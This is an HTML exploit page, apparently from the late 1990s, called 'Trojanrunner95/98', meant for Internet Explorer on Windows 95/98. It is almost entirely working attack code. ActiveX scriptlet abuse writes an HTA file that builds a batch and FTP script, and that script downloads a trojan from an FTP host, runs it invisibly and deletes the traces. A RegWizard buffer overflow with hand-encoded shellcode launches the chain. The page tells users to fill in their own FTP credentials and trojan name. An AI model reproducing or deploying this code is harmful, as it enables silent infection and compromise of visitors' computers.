<html>
<head> The Trojanrunner95/98, final version? nah.. there'll always be more to add, u should all thank microsoft :p </head>
<BODY>
<P>
<P>
<h1>This should not be used for illegal actions. The authors of these exploits, whom we're not, nor we accept being blamed for yur actions</h1>
<pre>
<br>This page will:</br>
1)create the Netmonn.hta file in c:\
2)create repair.zip in c:\ (script for FTP)
3)create repair.bat (batch file for downloading the troj)
4)RUN repair.bat INVISIBLY! (NEW, check this out, it works..!)

<br> CREDITS: Exxtreme, Stonefisk, OsioniusX (Guninski and Hird for the original exploit's)
<br>
<br>You should change:</br>
1)USERNAME to yur xoom's given username
2)PASSWD to yur xoom's passwd
3)trojan.exe to whatever name yur trojan



<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>


<object id="scr" classid="clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"></object>
<script>
scr.Path="C:\\Netmonn.hta";
scr.Doc="<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object><SCRIPT>wsh.Run('command /c echo ftp -v -i -s:c:\\\\repair.zip ftp.xoom.com>>c:\\\\repair.bat',true,1);wsh.Run('command /c echo trojan.exe>>c:\\\\repair.bat',true,1);wsh.Run('command /c echo deltree /y c:\\\\repair.zip>>c:\\\\repair.bat',true,1);wsh.Run('command /c echo deltree /y c:\\\\Netmonn.hta>>c:\\\\repair.bat',true,1);wsh.Run('command /c echo deltree /y c:\\\\repair.bat>>c:\\\\repair.bat',true,1);wsh.Run('command /c echo x1094xs2eton>> c:\\\\Repair.zip',false,6);wsh.Run('command /c echo password>> c:\\\\Repair.zip',false,6);wsh.Run('command /c echo lcd c:\\\\\windows>> c:\\\\Repair.zip',false,6);wsh.Run('command /c echo binary>> c:\\\\Repair.zip',false,6);wsh.Run('command /c echo get bonzai.exe>> c:\\\\Repair.zip',false,6);wsh.Run('command /c echo quit>>c:\\\\Repair.zip',false,6);wsh.Run('c:\\\\repair.bat',false,6)</"+"SCRIPT>";scr.write();
</script>


<object classid="clsid:50E5E3D1-C07E-11D0-B9FD-00A0249F6B00" id="RegWizObj"></object>
<script language="VbScript" >

expstr = "/i AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
expstr = expstr & Chr(235)
expstr = expstr & Chr(53)
expstr = expstr & Chr(208)
expstr = expstr & Chr(127)
expstr = expstr + Chr(144)
expstr = expstr + Chr(139) + Chr(252)
expstr = expstr + Chr(131) + Chr(199) + Chr(25)
expstr = expstr + Chr(80)
expstr = expstr + Chr(87)
expstr = expstr + Chr(186) + Chr(96) + Chr(9) + Chr(250) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + Chr(51) + Chr(192)
expstr = expstr + Chr(80)
expstr = expstr + Chr(186) + Chr(202) + Chr(212) + Chr(248) + Chr(191)
expstr = expstr + Chr(255) + Chr(210)
expstr = expstr + "mshta c:\Netmonn.hta"

RegWizObj.InvokeRegWizard(expstr)

</script>
</body>
</html>
 